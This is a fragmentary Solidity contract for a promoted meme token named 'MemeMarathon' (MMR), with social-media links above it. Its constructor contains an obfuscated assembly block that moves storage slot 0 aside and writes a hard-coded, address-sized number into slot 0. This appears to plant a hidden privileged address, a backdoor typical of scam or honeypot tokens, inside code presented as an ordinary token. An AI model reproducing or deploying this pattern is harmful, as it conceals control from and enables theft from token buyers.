...
Telegram: https://t.me/MemeMarathon/
Twitter: https://twitter.com/MemeMarathon/
Website: https://MemeMarathon.io
...
contract MemeMarathon {
    string public constant name = "MemeMarathon";
    string public constant symbol = "MMR";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1338573202391616006029577094277733719738850612472, 2))}
